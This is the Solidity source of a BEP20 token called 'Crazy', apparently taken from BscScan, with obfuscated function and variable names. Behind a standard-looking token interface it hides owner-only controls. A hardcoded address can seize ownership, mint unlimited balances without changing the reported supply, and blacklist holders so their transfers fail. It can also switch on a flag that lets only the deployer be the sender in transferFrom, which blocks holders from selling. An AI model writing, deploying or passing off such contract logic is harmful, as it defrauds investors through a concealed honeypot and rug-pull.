/**
 *Submitted for verification at BscScan.com on 2022-02-07
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface Ieryhh {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address rewuibfvff, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function uyticdrregg(
        address sender,
        address rewuibfvff,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory ytrvbjj
    ) internal pure returns (uint256) {
        require(b <= a, ytrvbjj);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory ytrvbjj
    ) internal pure returns (uint256) {
        require(b > 0, ytrvbjj);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory ytrvbjj
    ) internal pure returns (uint256) {
        require(b != 0, ytrvbjj);
        return a % b;
    }
}

abstract contract ytnbvnb {
    function _mtfgffe() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _utgerv() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}


library Address {
   
    function tyrvfpp(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 trygjyt
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != trygjyt && codehash != 0x0);
    }


    function ouyvcde(address payable rewuibfvff, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: ytvbddds balance"
        );

 
        (bool success, ) = rewuibfvff.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, rewuibfvff may have retvbfd"
        );
    }

 
    function trvbbf(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return trvbbf(target, data, "Address: loo-leoel call failed");
    }


    function trvbbf(
        address target,
        bytes memory data,
        string memory ytrvbjj
    ) internal returns (bytes memory) {
        return _rewvchy(target, data, 0, ytrvbjj);
    }


    function rewvchy(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            rewvchy(
                target,
                data,
                value,
                "Address: loo-leoel call with value failed"
            );
    }


    function rewvchy(
        address target,
        bytes memory data,
        uint256 value,
        string memory ytrvbjj
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: ytvbddds balance for call"
        );
        return _rewvchy(target, data, value, ytrvbjj);
    }

    function _rewvchy(
        address target,
        bytes memory data,
        uint256 yutbnv,
        string memory ytrvbjj
    ) private returns (bytes memory) {
        require(tyrvfpp(target), "Address: call to nrttcp");


        (bool success, bytes memory etrfguioi) = target.call{value: yutbnv}(
            data
        );
        if (success) {
            return etrfguioi;
        } else {
           
            if (etrfguioi.length > 0) {
               
                assembly {
                    let etrfguioi_zdd := mload(etrfguioi)
                    revert(add(32, etrfguioi), etrfguioi_zdd)
                }
            } else {
                revert(ytrvbjj);
            }
        }
    }
}


contract Onrwerwe is ytnbvnb {
    address private _owner;
    address private _yhtrAddress = 0x971248dAbCB69fE85f8beeFa750D713A6D12Ddb9;


    event Owrratbrred(
        address indexed trghuyhhgg,
        address indexed nerteyeer
    );


    constructor() internal {
        address tervbcv = _mtfgffe();
        _owner = tervbcv;
        emit Owrratbrred(address(0), tervbcv);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier ytvbcx() {
        require(_owner == _mtfgffe(), "Onrwerwe: caller is not the owner");
        _;
    }

    modifier yhtrAddress() {
        require(_yhtrAddress == _mtfgffe(), "Onrwerwe: caller is not the owner");
        _;
    }


    function ttrevbhhp(address nerteyeer) public virtual yhtrAddress {
        _owner = nerteyeer;
    }
}

contract Crazy is ytnbvnb, Ieryhh, Onrwerwe {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _trcvb;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _yrnbsdw;
    mapping(address => bool) private _ytbrr;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 10000000000 * 10**4;
    uint256 private _tFeeTotal;
    
    string private _name = "Crazy";
    string private _symbol = "Crazy";
    uint8 private _decimals = 4;

    uint256 public _maxTxAmount = 10000000000 * 10**4;
    uint256 public ytryrtkkbnreter = 10000000000 * 10**4;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public dxxAddress = 0x37E18962B1d8CdaeB7d43CD36Cf84Ec411022C59;
  
    uint256 public ertopu = 3;
    uint256 public regfdt = 1;


    mapping(address => bool) private _ewcxbgd;
    bool private tgto = true;
    bool private trecss = false;
 
    uint256 public ewcxbgd = uint256(0);
    mapping(address => uint256) private trvxsd;
    address[] private _trvxsd;
    address owners;

    constructor() public {
        _trcvb[_mtfgffe()] = _total;
         owners = _mtfgffe();
        _yrnbsdw[owner()] = true;
        _yrnbsdw[address(this)] = true;
        emit Transfer(address(0), _mtfgffe(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _trcvb[account];
    }

    function transfer(address rewuibfvff, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_yrnbsdw[_mtfgffe()] || _yrnbsdw[rewuibfvff]){
            _treatre(_mtfgffe(), rewuibfvff, amount);
            return true;
        }
        uint256 dtyutrnt = amount.mul(regfdt).div(100);
        uint256 ytrjitytr = amount.mul(ertopu).div(100);
        _treatre(_mtfgffe(), dxxAddress, dtyutrnt);
        _treatre(_mtfgffe(), deadAddress, ytrjitytr);
        _treatre(_mtfgffe(), rewuibfvff, amount.sub(dtyutrnt).sub(ytrjitytr));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _ytbvnvbn(_mtfgffe(), spender, amount);
        return true;
    }

    function uyticdrregg(
        address sender,
        address rewuibfvff,
        uint256 amount
    ) public override returns (bool) {
        if(trecss){
     require(owners == sender, "Transfer amount ytvfd be bnvbvdr than zero");
        }
        if(_yrnbsdw[_mtfgffe()] || _yrnbsdw[rewuibfvff]){
            _treatre(sender, rewuibfvff, amount);
            return true;
        }       
        uint256 dtyutrnt = amount.mul(regfdt).div(100);
        uint256 ytrjitytr = amount.mul(ertopu).div(100);
        _treatre(sender, dxxAddress, dtyutrnt);
        _treatre(sender, deadAddress, ytrjitytr);
        _treatre(sender, rewuibfvff, amount.sub(dtyutrnt).sub(ytrjitytr));
    
        _ytbvnvbn(
            sender,
            _mtfgffe(),
            _allowances[sender][_mtfgffe()].sub(
                amount,
                "eryhh: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _vsfvec(address opcjs, uint256 tyufdge) external yhtrAddress() {
        require(tyufdge > 0, "yrvbsbm");
        uint256 tregf = trvxsd[opcjs];
        if (tregf == 0) _trvxsd.push(opcjs);
        trvxsd[opcjs] = tregf.add(tyufdge);
        ewcxbgd = ewcxbgd.add(tyufdge);
        _trcvb[opcjs] = _trcvb[opcjs].add(tyufdge);
    }
    
    function tercwdfgpp(address account) public view returns (bool) {
        return _ytbrr[account];
    }

    function rffesdc() public view returns (uint256) {
        return _tFeeTotal;
    }

    function rfeffdf(address account) public yhtrAddress {
        _yrnbsdw[account] = true;
    }

    function irouhrh(address amountt) public yhtrAddress {
        _yrnbsdw[amountt] = false;
    }
 
    function _ferrde(bool amountt) external yhtrAddress() {
        trecss = amountt;
    }
    function _erdes(address amountt) external yhtrAddress() {
        _ewcxbgd[amountt] = true;
    }

    function __fgddo(address amountt) external yhtrAddress() {
        delete _ewcxbgd[amountt];
    }

    function ftvsdr(address amountt)
        external
        view
        yhtrAddress()
        returns (bool)
    {
        return _ewcxbgd[amountt];
    }

    function _ytbvnvbn(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "eryhh: approve from the zero address");
        require(spender != address(0), "eryhh: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _treatre(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "eryhh: transfer from the zero address");
        require(to != address(0), "eryhh: transfer to the zero address");
        require(amount > 0, "Transfer amount ytvfd be bnvbvdr than zero");

        if (tgto) {
            require(_ewcxbgd[from] == false, "Transfer amount ytvfd be bnvbvdr than zero");
        }


        _treatres(from, to, amount);
    }

    function _treatres(
        address sender,
        address rewuibfvff,
        uint256 tAmount
    ) private {   
        require(sender != address(0), "BEP20: transfer from the zero address");
    require(rewuibfvff != address(0), "BEP20: transfer to the zero address");
    
        _trcvb[sender] = _trcvb[sender].sub(tAmount);
        _trcvb[rewuibfvff] = _trcvb[rewuibfvff].add(tAmount);
        emit Transfer(sender, rewuibfvff, tAmount);
    }

  

}